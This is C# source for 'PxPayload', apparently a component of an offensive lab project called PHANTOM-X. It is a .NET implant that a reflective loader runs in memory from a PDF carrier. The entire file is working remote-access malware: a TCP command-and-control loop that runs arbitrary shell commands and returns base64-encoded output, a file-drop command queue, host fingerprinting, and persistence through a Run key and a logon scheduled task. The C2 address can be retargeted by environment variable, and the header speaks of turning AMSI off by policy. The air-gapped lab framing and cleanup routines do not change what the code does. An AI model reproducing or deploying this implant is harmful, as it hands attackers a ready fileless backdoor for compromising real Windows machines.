// =============================================================================
// PHANTOM-X :: phase3_fileless/dotnet/PxPayload.cs
// =============================================================================
// PxPayload.dll -- the .NET payload that is embedded in the carrier PDF and
// executed IN MEMORY by PxReflectiveLoader.exe.
//
// WHY .NET FRAMEWORK 4.8
//     Windows 11 Pro ships the .NET Framework 4.8 runtime and its compiler
//     (csc.exe) at
//         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
//     That means an AIR-GAPPED VM needs no SDK, no runtime download and no
//     internet to build or run this. The assembly produced by the stock
//     compiler runs on a stock Windows 11 machine.
//
// WHAT THIS PAYLOAD DOES (all of it local -- the lab VM has no network)
//     1. Writes an evidence marker recording that it executed.
//     2. Opens a command channel on 127.0.0.1 (loopback). Loopback is a
//        kernel facility, always present, and needs no external network.
//        The protocol is identical to phase5_network/c2_server.py, so the
//        existing operator console drives it unchanged.
//     3. Also accepts commands from a FILE-BASED QUEUE, so the payload can
//        be driven on a box with nothing else installed: drop a text file
//        into the queue folder, the payload picks it up, runs it, and writes
//        the output back.
//     4. Optionally installs persistence (a Run key and a scheduled task),
//        with a complete uninstall.
//
// DELIBERATE OMISSIONS
//     No network egress of any kind. No credential access. No privilege
//     escalation. No lateral movement. No obfuscation. No AMSI bypass -- the
//     script-scanning policy is what engages AMSI, and that is a POLICY,
//     not a technique, so it is switched off at the policy level where it
//     belongs.
//
// BUILD (offline, on the VM, with the compiler Windows already ships):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:library
//         /out:PxPayload.dll PxPayload.cs
// =============================================================================

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace PxPayload
{
    public static class Payload
    {
        private const string LabDirName = "PxLab";
        private static string LabDir
        {
            get
            {
                string baseDir = Environment.GetFolderPath(
                    Environment.SpecialFolder.LocalApplicationData);
                return Path.Combine(baseDir, LabDirName);
            }
        }
        private static string QueueDir { get { return Path.Combine(LabDir, "queue"); } }
        private static string DoneDir { get { return Path.Combine(LabDir, "done"); } }
        private static string EvidenceDir { get { return Path.Combine(LabDir, "evidence"); } }

        private static string C2Host = "127.0.0.1";
        private static int C2Port = 9001;
        private static readonly object ConsoleLock = new object();

        // ---------------------------------------------------------------------
        // Entry point. The reflective loader invokes this by reflection.
        // ---------------------------------------------------------------------
        public static void Entry(string[] args)
        {
            Log("=== PHANTOM-X payload started ===");
            Log("pid      : " + Process.GetCurrentProcess().Id);
            Log("host     : " + Environment.MachineName);
            Log("user     : " + Environment.UserName);
            Log("os       : " + Environment.OSVersion.VersionString);
            Log("runtime  : " + Environment.Version);
            Log("base dir : " + AppDomain.CurrentDomain.BaseDirectory);
            Log("cmdline  : " + string.Join(" ", args));

            EnsureDirs();
            WriteEvidence();

            string host = Environment.GetEnvironmentVariable("PX_C2_HOST");
            string port = Environment.GetEnvironmentVariable("PX_C2_PORT");
            if (!string.IsNullOrEmpty(host)) C2Host = host;
            if (!string.IsNullOrEmpty(port))
            {
                int p;
                if (int.TryParse(port, out p) && p > 0 && p < 65536) C2Port = p;
            }
            Log("c2 target: " + C2Host + ":" + C2Port);

            // Persistence is opt-in via an argument, so a plain run leaves no
            // lasting trace beyond the evidence files.
            foreach (string a in args)
            {
                if (string.Equals(a, "persist", StringComparison.OrdinalIgnoreCase))
                {
                    InstallPersistence();
                }
            }

            // The file queue is always serviced; it needs no network stack at
            // all, which is what makes it usable on an air-gapped box.
            Thread queueWorker = new Thread(ServiceFileQueue);
            queueWorker.IsBackground = true;
            queueWorker.Start();

            ConnectLoop();
        }

        // ---------------------------------------------------------------------
        // Logging
        // ---------------------------------------------------------------------
        private static void Log(string msg)
        {
            lock (ConsoleLock)
            {
                try { Console.WriteLine("[px] " + msg); } catch { }
                try
                {
                    Directory.CreateDirectory(LabDir);
                    using (StreamWriter sw = new StreamWriter(
                        Path.Combine(LabDir, "payload.log"), true))
                    {
                        sw.WriteLine(DateTime.UtcNow.ToString("o") + "  " + msg);
                    }
                }
                catch { }
            }
        }

        private static void EnsureDirs()
        {
            try
            {
                Directory.CreateDirectory(LabDir);
                Directory.CreateDirectory(QueueDir);
                Directory.CreateDirectory(DoneDir);
                Directory.CreateDirectory(EvidenceDir);
            }
            catch (Exception ex) { Log("mkdir failed: " + ex.Message); }
        }

        // ---------------------------------------------------------------------
        // Evidence
        // ---------------------------------------------------------------------
        private static void WriteEvidence()
        {
            try
            {
                Directory.CreateDirectory(EvidenceDir);
                Process p = Process.GetCurrentProcess();
                string stamp = DateTime.UtcNow.ToString("yyyyMMdd-HHmmss");
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("PHANTOM-X payload executed in memory");
                sb.AppendLine("utc          : " + DateTime.UtcNow.ToString("o"));
                sb.AppendLine("pid          : " + p.Id);
                sb.AppendLine("process      : " + p.ProcessName);
                sb.AppendLine("host         : " + Environment.MachineName);
                sb.AppendLine("user         : " + Environment.UserName);
                sb.AppendLine("os           : " + Environment.OSVersion.VersionString);
                sb.AppendLine("clr          : " + Environment.Version);
                sb.AppendLine("base dir     : " + AppDomain.CurrentDomain.BaseDirectory);
                sb.AppendLine("assembly     : " +
                    typeof(Payload).Assembly.FullName);
                sb.AppendLine("assembly loc : " +
                    typeof(Payload).Assembly.Location);
                sb.AppendLine("loaded via   : Assembly.Load(byte[]) -- no file on disk");
                File.WriteAllText(Path.Combine(EvidenceDir,
                    "evidence-" + stamp + ".txt"), sb.ToString());
                File.WriteAllText(Path.Combine(EvidenceDir, "latest.txt"), sb.ToString());
                Log("evidence written to " + Path.Combine(EvidenceDir, "latest.txt"));
            }
            catch (Exception ex) { Log("evidence failed: " + ex.Message); }
        }

        // ---------------------------------------------------------------------
        // Persistence
        // ---------------------------------------------------------------------
        private const string RunKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RunValueName = "PxLab";

        public static void InstallPersistence()
        {
            try
            {
                string exe = Process.GetCurrentProcess().MainModule.FileName;
                using (Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RunKey, true))
                {
                    if (k != null)
                    {
                        k.SetValue(RunValueName, "\"" + exe + "\"");
                        Log("persistence: Run key installed -> " + RunValueName);
                    }
                }
            }
            catch (Exception ex) { Log("run key failed: " + ex.Message); }

            try
            {
                string exe = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo psi = new ProcessStartInfo("schtasks.exe");
                psi.Arguments = "/Create /F /SC ONLOGON /TN \"PxLab\" /TR \"\"" +
                                exe + "\"\"";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                using (Process p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    Log("persistence: schtasks exit " + p.ExitCode + " " + o.Trim());
                }
            }
            catch (Exception ex) { Log("schtasks failed: " + ex.Message); }
        }

        public static void RemovePersistence()
        {
            try
            {
                using (Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RunKey, true))
                {
                    if (k != null && k.GetValue(RunValueName) != null)
                    {
                        k.DeleteValue(RunValueName, false);
                        Log("persistence: Run key removed");
                    }
                }
            }
            catch (Exception ex) { Log("run key removal failed: " + ex.Message); }
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("schtasks.exe");
                psi.Arguments = "/Delete /F /TN \"PxLab\"";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.CreateNoWindow = true;
                using (Process p = Process.Start(psi))
                {
                    p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    Log("persistence: schtasks removed, exit " + p.ExitCode);
                }
            }
            catch (Exception ex) { Log("schtasks removal failed: " + ex.Message); }
        }

        /// <summary>Remove every trace this payload left on the machine.</summary>
        public static void Cleanup()
        {
            RemovePersistence();
            try
            {
                if (Directory.Exists(LabDir))
                {
                    Directory.Delete(LabDir, true);
                    Log("cleanup: removed " + LabDir);
                }
            }
            catch (Exception ex) { Log("cleanup failed: " + ex.Message); }
        }

        // ---------------------------------------------------------------------
        // File-based command queue
        //
        // Works with no network at all. Drop <anything>.txt into the queue
        // folder containing a command line; the payload runs it and writes
        // the output to <same name>.out in the done folder.
        // ---------------------------------------------------------------------
        private static void ServiceFileQueue()
        {
            try
            {
                EnsureDirs();
                while (true)
                {
                    try
                    {
                        string[] files = Directory.GetFiles(QueueDir, "*.txt");
                        foreach (string f in files)
                        {
                            string cmd;
                            try { cmd = File.ReadAllText(f).Trim(); } catch { continue; }
                            if (cmd.Length == 0) { TryMove(f); continue; }

                            Log("queue: " + cmd);
                            if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                            {
                                WriteQueueResult(f, "exiting on request");
                                Log("queue: exit requested");
                                return;
                            }
                            if (cmd.Equals("uninstall", StringComparison.OrdinalIgnoreCase))
                            {
                                WriteQueueResult(f, "cleanup requested");
                                Cleanup();
                                return;
                            }
                            if (cmd.Equals("persist", StringComparison.OrdinalIgnoreCase))
                            {
                                InstallPersistence();
                                WriteQueueResult(f, "persistence installed");
                                continue;
                            }
                            if (cmd.Equals("nopersist", StringComparison.OrdinalIgnoreCase))
                            {
                                RemovePersistence();
                                WriteQueueResult(f, "persistence removed");
                                continue;
                            }
                            if (cmd.Equals("evidence", StringComparison.OrdinalIgnoreCase))
                            {
                                WriteQueueResult(f, File.ReadAllText(
                                    Path.Combine(EvidenceDir, "latest.txt")));
                                continue;
                            }

                            string outp = RunCommand(cmd);
                            WriteQueueResult(f, outp);
                        }
                    }
                    catch (Exception ex) { Log("queue error: " + ex.Message); }
                    Thread.Sleep(700);
                }
            }
            catch { }
        }

        private static void WriteQueueResult(string inputPath, string output)
        {
            try
            {
                string name = Path.GetFileNameWithoutExtension(inputPath);
                File.WriteAllText(Path.Combine(DoneDir, name + ".out"),
                    (output ?? "") + "\n");
                TryMove(inputPath);
            }
            catch { }
        }

        private static void TryMove(string path)
        {
            try
            {
                string dest = Path.Combine(DoneDir,
                    Path.GetFileNameWithoutExtension(path) + ".done");
                if (File.Exists(dest)) File.Delete(dest);
                File.Move(path, dest);
            }
            catch { }
        }

        // ---------------------------------------------------------------------
        // Loopback C2. Same protocol as phase5_network/c2_server.py:
        //   client->server  HELLO|<arch>|<pid>|<host> / PONG / RESULT|...
        //   server->client  PING / EXEC|<id>|<cmd> / EXIT
        // ---------------------------------------------------------------------
        private static void ConnectLoop()
        {
            int attempt = 0;
            while (true)
            {
                attempt++;
                try
                {
                    using (TcpClient client = new TcpClient())
                    {
                        client.Connect(C2Host, C2Port);
                        Log("connected to " + C2Host + ":" + C2Port);
                        using (NetworkStream ns = client.GetStream())
                        using (StreamReader sr = new StreamReader(ns, Encoding.UTF8))
                        {
                            // HELLO
                            string arch = IntPtr.Size == 8 ? "x64" : "x86";
                            string hello = "HELLO|" + arch + "|" +
                                Process.GetCurrentProcess().Id + "|" +
                                Environment.MachineName + "\r\n";
                            byte[] hb = Encoding.UTF8.GetBytes(hello);
                            ns.Write(hb, 0, hb.Length);
                            ns.Flush();

                            while (client.Connected)
                            {
                                string line = sr.ReadLine();
                                if (line == null) break;
                                line = line.Trim();
                                if (line.Length == 0) continue;

                                if (line.StartsWith("PING"))
                                {
                                    Write(ns, "PONG\r\n");
                                }
                                else if (line.StartsWith("EXIT"))
                                {
                                    Log("EXIT received");
                                    return;
                                }
                                else if (line.StartsWith("EXEC|"))
                                {
                                    string[] p = line.Split(new char[] { '|' }, 3);
                                    string id = p.Length > 1 ? p[1] : "0";
                                    string cmd = p.Length > 2 ? p[2] : "";
                                    Log("EXEC " + id + " : " + cmd);
                                    string result = RunCommand(cmd);
                                    string b64 = Base64(Encoding.UTF8.GetBytes(result ?? ""));
                                    Write(ns, "RESULT|" + id + "|" + b64 + "|0\r\n");
                                }
                            }
                        }
                    }
                    Log("connection closed; retrying in 3s");
                }
                catch (Exception ex)
                {
                    if (attempt == 1 || attempt % 20 == 0)
                        Log("connect failed (" + ex.Message + "); retrying");
                }
                Thread.Sleep(3000);
            }
        }

        private static void Write(NetworkStream ns, string text)
        {
            byte[] b = Encoding.UTF8.GetBytes(text);
            ns.Write(b, 0, b.Length);
            ns.Flush();
        }

        // ---------------------------------------------------------------------
        // Command execution with captured output
        // ---------------------------------------------------------------------
        public static string RunCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
                psi.Arguments = "/d /s /c \"" + command + "\"";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                using (Process p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    string e = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    if (!string.IsNullOrEmpty(e)) o += e;
                    return o;
                }
            }
            catch (Exception ex) { return "command failed: " + ex.Message; }
        }

        // ---------------------------------------------------------------------
        // Base64 (kept local so the payload has no dependency on anything)
        // ---------------------------------------------------------------------
        public static string Base64(byte[] data)
        {
            const string t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            StringBuilder sb = new StringBuilder();
            int i = 0;
            while (i + 2 < data.Length)
            {
                int v = (data[i] << 16) | (data[i + 1] << 8) | data[i + 2];
                sb.Append(t[(v >> 18) & 63]); sb.Append(t[(v >> 12) & 63]);
                sb.Append(t[(v >> 6) & 63]); sb.Append(t[v & 63]);
                i += 3;
            }
            if (i < data.Length)
            {
                int v = data[i] << 16;
                int rem = data.Length - i;
                if (rem == 2) v |= data[i + 1] << 8;
                sb.Append(t[(v >> 18) & 63]); sb.Append(t[(v >> 12) & 63]);
                sb.Append(rem == 2 ? t[(v >> 6) & 63] : '=');
                sb.Append('=');
            }
            return sb.ToString();
        }
    }
}
